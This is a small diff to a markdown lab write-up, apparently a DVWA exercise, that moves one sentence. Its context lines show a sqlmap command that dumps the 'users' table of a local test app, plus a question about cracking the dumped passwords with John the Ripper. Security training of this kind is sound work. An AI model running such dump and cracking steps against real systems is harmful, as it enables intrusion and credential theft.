@@ -273,10 +273,10 @@ This option tells sqlmap to extract and display the contents of the specified ta
 sqlmap -u "http://localhost:8080/vulnerabilities/sqli" --cookie="PHPSESSID=8i0tfhbnhtb8oe03hmukldr8n3; security=medium " --data="id=1&Submit=Submit" --batch -D dvwa -T users --dump
 ```
 
-Retrun all columns and all row of table named users
-
 ![image](https://github.com/user-attachments/assets/70f0eef2-adaa-4242-b3d2-279322f1da2b)
 
+
+Retrun all columns and all row of table named users
 
 
 **Question 3**: Make use of John the Ripper to disclose the password of all database users from the above exploit
